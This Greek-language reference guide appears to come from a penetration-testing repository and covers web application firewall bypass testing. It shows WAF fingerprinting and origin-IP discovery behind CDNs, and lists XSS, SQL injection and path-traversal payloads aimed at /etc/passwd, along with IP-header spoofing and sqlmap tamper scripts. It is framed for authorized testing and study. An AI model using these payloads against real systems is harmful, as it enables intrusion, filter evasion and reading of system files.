# 🛡️ WAF Bypass — Οδηγός ελέγχων φίλτρων web

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
   Έλεγχοι φίλτρων εφαρμογών web (WAF)
```

---

## Πριν ξεκινήσετε

Το **WAF (Web Application Firewall)** ελέγχει την κίνηση προς εφαρμογές web. Ο οδηγός παρουσιάζει τρόπους αναγνώρισης φίλτρων και περιπτώσεις διαφορετικής ερμηνείας αιτημάτων. Η ύπαρξη μιας παραλλαγής payload δεν σημαίνει ότι λειτουργεί σε κάθε browser, βάση δεδομένων ή WAF.

**Βασικοί όροι:** *origin* = αρχικός server πίσω από διαμεσολαβητή, *CDN* = δίκτυο διανομής περιεχομένου, *encoding* = κωδικοποίηση, *normalization* = μετατροπή εισόδου σε κοινή μορφή, *payload* = δοκιμαστική είσοδος. Η παράκαμψη φίλτρου και η ύπαρξη ευπάθειας στην εφαρμογή είναι διαφορετικά ζητήματα.

Μελετήστε τα παραδείγματα σε εργαστήριο ή μέσα στο συμφωνημένο scope. Οι αρχικές εντολές διατηρούνται αυτούσιες· οι παρατηρήσεις εξηγούν περιορισμούς και ανακρίβειες.

## Περιεχόμενα

- [🎯 Τι είναι ο έλεγχος παράκαμψης WAF](#section-01)
- [🔍 Αναγνώριση ενδείξεων φίλτρων WAF](#section-02)
- [🌐 Αναζήτηση IP του αρχικού server](#section-03)
- [🔓 Έλεγχοι διαφορετικής κωδικοποίησης εισόδων](#section-04)
- [🔥 Παραδείγματα ελέγχων φίλτρων WAF](#section-05)
- [🛠️ Τεχνικές HTTP](#section-06)
- [🛠️ Εργαλεία](#section-07)
- [📊 Γρήγορη αναφορά](#section-08)
- [📚 Πηγές](#section-09)

---

<a id="section-01"></a>

## 🎯 Τι είναι ο έλεγχος παράκαμψης WAF

Οι τεχνικές **WAF bypass** εξετάζουν αν τα φίλτρα web μπορούν να παρακαμφθούν λόγω διαφορετικής ερμηνείας εισόδων ή έκθεσης του αρχικού server. Τα παραδείγματα δεν εγγυώνται επιτυχή παράκαμψη.

### Συνήθη προϊόντα WAF
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- ModSecurity
- F5 BIG-IP
- Fortinet FortiWeb
- Sucuri

---

<a id="section-02"></a>

## 🔍 Αναγνώριση ενδείξεων φίλτρων WAF

### wafw00f
```bash
# Αναγνώριση ενδείξεων WAF
wafw00f https://target.com

# Αναλυτική έξοδος
wafw00f https://target.com -v

# Δοκιμή όλων των διαθέσιμων υπογραφών WAF
wafw00f https://target.com -a
```

### Χειροκίνητη αναγνώριση
```bash
# Εξέταση κεφαλίδων απόκρισης
curl -I https://target.com

# Αναζητήστε ενδείξεις όπως:
# - Server: cloudflare
# - X-Sucuri-ID
# - X-CDN: Incapsula
# - cf-ray (Cloudflare)
```

---

<a id="section-03"></a>

## 🌐 Αναζήτηση IP του αρχικού server

> **Συσχετίσεις και εκδόσεις:** Μια IP σε email, πιστοποιητικό ή παλιά εγγραφή μπορεί να ανήκει σε διαφορετική υπηρεσία ή προηγούμενο κάτοχο. Οι κεφαλίδες και τα fingerprints είναι ενδείξεις. Τα πεδία αναζήτησης και τα APIs των Censys/Shodan αλλάζουν· τα παραδείγματα χρειάζονται έλεγχο συμβατότητας.


### Ιστορικό DNS
```bash
# Ενδεικτικές υπηρεσίες αναζήτησης:
# - SecurityTrails.com
# - ViewDNS.info/iphistory
# - DNSHistory.org
# - CompleteDNS.com

# SecurityTrails API
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY"
```

### Αναζήτηση πιστοποιητικών SSL/TLS
```bash
# Αναζήτηση πιστοποιητικών στο Censys.io
# Αναζήτηση του target.com μέσα στο πιστοποιητικό

# crt.sh — δημόσιες καταγραφές πιστοποιητικών
curl "https://crt.sh/?q=target.com&output=json" | jq

# Censys CLI
censys search "parsed.names: target.com"
```

### Shodan/Censys
```bash
# Shodan
shodan search "ssl:target.com"
shodan search "hostname:target.com"

# Shodan — αναζήτηση βάσει αποτυπώματος πιστοποιητικού SSL/TLS
shodan search "ssl.cert.fingerprint:XXXX"

# Censys
# Search: services.tls.certificates.leaf_data.subject.common_name: target.com
```

### Κεφαλίδες email
```bash
# Παράδειγμα εγγραφής σε ενημερωτικό μήνυμα ή ειδοποίηση
# Εξέταση κεφαλίδων email για πιθανή IP αρχικού server

# Αναζητήστε ενδείξεις όπως:
# Received: from [ORIGIN_IP]
# X-Originating-IP: [ORIGIN_IP]
```

### Υποτομείς που ενδέχεται να μην περνούν από CDN
```bash
# Αναζήτηση υποτομέων
subfinder -d target.com -o subs.txt

# Συλλογή διευθύνσεων για διασταύρωση με υποδομές CDN
cat subs.txt | httpx -ip

# Αναζητήστε ενδείξεις όπως:
# - mail.target.com
# - ftp.target.com
# - dev.target.com
# - staging.target.com
# - api-internal.target.com
# - vpn.target.com
```

### Hash εικονιδίου ιστοτόπου (Favicon)

> **Διαφορετικοί αλγόριθμοι:** Το md5sum και το MurmurHash3 πάνω σε κατάλληλα κωδικοποιημένα δεδομένα δεν είναι το ίδιο αποτύπωμα. Το φίλτρο favicon του Shodan δεν αναζητά το MD5 του πρώτου παραδείγματος. Ίδιο favicon δεν αποδεικνύει ίδιο οργανισμό ή αρχικό server.

```bash
# Υπολογισμός αποτυπώματος favicon
curl -s https://target.com/favicon.ico | md5sum

# Υπολογισμός αποτυπώματος favicon στη μορφή αναζήτησης του Shodan
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# Αναζήτηση στο Shodan
shodan search "http.favicon.hash:HASH_VALUE"
```

### Έλεγχος της διαδρομής IPv6
```bash
# Η διαδρομή IPv6 μπορεί να έχει διαφορετική ρύθμιση προστασίας
dig AAAA target.com
curl -g "http://[IPv6_ADDRESS]/" -H "Host: target.com"
```

### Εύρη διευθύνσεων cloud
```bash
# Λήψη καταλόγων εύρους IP cloud
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# GCP: https://www.gstatic.com/ipranges/cloud.json

# IP εκτός γνωστών ευρών cloud είναι μόνο ένδειξη, όχι επιβεβαιωμένος αρχικός server
```

---

<a id="section-04"></a>

## 🔓 Έλεγχοι διαφορετικής κωδικοποίησης εισόδων

> **Δεν είναι ισοδύναμες εκτελέσιμες είσοδοι παντού:** Η αποκωδικοποίηση εξαρτάται από το συγκεκριμένο σημείο και τις ενδιάμεσες μετατροπές. Η ακολουθία με C0 στο παράδειγμα UTF-8 είναι μη έγκυρη υπερμήκης κωδικοποίηση. Σπάσιμο λέξης SQL με σχόλια, null bytes ή αλλαγή πεζών/κεφαλαίων δεν διατηρεί γενικά την ίδια σημασία σε κάθε parser.


### Κωδικοποίηση URL
```
# Μονή κωδικοποίηση
<script> → %3Cscript%3E

# Διπλή κωδικοποίηση
<script> → %253Cscript%253E

# Μικτή κωδικοποίηση
<script> → %3Cscr%69pt%3E
```

### Κωδικοποίηση Unicode
```
# Ετικέτα του πρωτοτύπου· η παρακάτω υπερμήκης ακολουθία δεν είναι έγκυρο UTF-8
<script> → %C0%BC%73%63%72%69%70%74%C0%BE

# Ακολουθίες διαφυγής Unicode
<script> → \u003cscript\u003e

# Οντότητες χαρακτήρων HTML
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

### Αλλαγή πεζών και κεφαλαίων
```
<script> → <ScRiPt>
<script> → <SCRIPT>
SELECT → SeLeCt
UNION → UnIoN
```

### Μηδενικά bytes
```
# Εισαγωγή μηδενικού byte
<scri%00pt>
<script%00>alert(1)</script>
SEL%00ECT
```

### Σχόλια
```sql
# Σχόλια SQL
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# Ενσωματωμένα σχόλια
SELECT/*comment*/FROM
1'/**/OR/**/1=1--
```

### Εναλλακτικοί χαρακτήρες κενού
```sql
# Χαρακτήρες tab, αλλαγής γραμμής και επιστροφής
SELECT%09FROM
SELECT%0AFROM
SELECT%0DFROM

# Σύμβολο πρόσθεσης
UNION+SELECT
1'+OR+1=1--
```

---

<a id="section-05"></a>

## 🔥 Παραδείγματα ελέγχων φίλτρων WAF

### Παραλλαγές εισόδων XSS
```html
# Συνηθισμένη είσοδος που ενδέχεται να αποκλείεται
<script>alert(1)</script>

# Παραλλαγές για έλεγχο διαφορετικής ερμηνείας
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

# Χωρίς παρενθέσεις
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>

# Με διαφορετική συνάρτηση από την alert
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

### Παραλλαγές εισόδων SQL injection
```sql
# Παραλλαγές της UNION
UNION SELECT → UNION ALL SELECT
UNION SELECT → /*!50000UNION*/ SELECT
UNION SELECT → %55nion %53elect
UNION SELECT → uNioN sEleCt

# Παραλλαγές σχολίων
-- → #
-- → --+
-- → --%00
-- → /**/

# Παραλλαγές λογικών εκφράσεων
OR 1=1 → OR 2=2
OR 1=1 → OR 'a'='a'
OR 1=1 → || 1=1
AND 1=1 → && 1=1

# Σχόλια που εξαρτώνται από έκδοση MySQL
/*!50000SELECT*/ → Υπό συνθήκη εκτέλεση ανά έκδοση MySQL, σύμφωνα με το πρωτότυπο
```

### Παραλλαγές διαδρομών αρχείων
```
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

<a id="section-06"></a>

## 🛠️ Τεχνικές HTTP

> **Εμπιστοσύνη και parsing:** Οι κεφαλίδες δηλωμένης IP δεν αλλάζουν την πραγματική προέλευση σύνδεσης και έχουν σημασία μόνο όταν η εφαρμογή τις εμπιστεύεται. Οι επαναλαμβανόμενες παράμετροι, οι μέθοδοι και το chunked απαιτούν συγκεκριμένη διαφορά ερμηνείας· δεν είναι από μόνα τους bypass.


### Πολλαπλές τιμές παραμέτρων HTTP
```http
# Επαναλαμβανόμενες παράμετροι
?id=1&id=2
?id=1&ID=2

# Είσοδος με σύνταξη πίνακα
?id[]=1&id[]=2
?id=1&id=2&id=3
```

### Αλλαγή μεθόδου HTTP
```bash
# Αλλαγή μεθόδου
curl -X POST → curl -X PUT
curl -X GET → curl -X TRACE

# Κεφαλίδες αιτήματος αλλαγής μεθόδου
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

### Αλλαγή κεφαλίδων
```http
# Κεφαλίδες που δηλώνουν IP πελάτη· ισχύουν μόνο αν τις εμπιστεύεται η υποδομή
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Διαφορετική ερμηνεία τύπου περιεχομένου
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/xml
```

### Μεταφορά σώματος σε τμήματα (chunked)
```http
Transfer-Encoding: chunked

4
test
0
```

---

<a id="section-07"></a>

## 🛠️ Εργαλεία

| Εργαλείο | Σκοπός |
|------|---------|
| **wafw00f** | Αναγνώριση WAF |
| **CloudFlair** | Αναζήτηση αρχικού server πίσω από Cloudflare |
| **Bypass-Firewalls-by-DNS-History** | Αναζήτηση ιστορικού DNS |
| **WhatWaf** | Αναγνώριση WAF και δοκιμές φίλτρων |
| **sqlmap --tamper** | Scripts μετασχηματισμού εισόδων SQL injection |

### Scripts μετασχηματισμού εισόδων του sqlmap
```bash
# Χρήση scripts μετασχηματισμού εισόδων
sqlmap -u "http://target.com/id=1" --tamper=space2comment
sqlmap -u "http://target.com/id=1" --tamper=randomcase
sqlmap -u "http://target.com/id=1" --tamper=between

# Συνδυασμός scripts μετασχηματισμού
sqlmap -u "http://target.com/id=1" --tamper=space2comment,randomcase
```

---

<a id="section-08"></a>

## 📊 Γρήγορη αναφορά

| Τεχνική | Χρήση |
|-----------|----------|
| Ιστορικό DNS | Αναζήτηση IP αρχικού server |
| Αναζήτηση πιστοποιητικών SSL/TLS | Αναζήτηση πιστοποιητικών σε Censys/Shodan |
| Αναζήτηση υποτομέων | Αναζήτηση υποτομέων χωρίς εμφανή διαμεσολάβηση CDN |
| Κωδικοποίηση | Έλεγχος διαφορετικής ερμηνείας από φίλτρα |
| Παραλλαγές πεζών και κεφαλαίων | Έλεγχος απλών κανόνων |
| Σχόλια | Παρεμβολή στοιχείων σε λέξεις κλειδιά |

---

<a id="section-09"></a>

## 📚 Πηγές

- [PayloadsAllTheThings WAF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass)
- [OWASP WAF Bypass](https://owasp.org/www-community/attacks/Bypass_Web_Application_Firewall)

---

<p align="center">
  <b>🛡️ Κατανοήστε και ελέγξτε τα φίλτρα web!</b><br>
  <i>Μόνο για εξουσιοδοτημένους ελέγχους.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
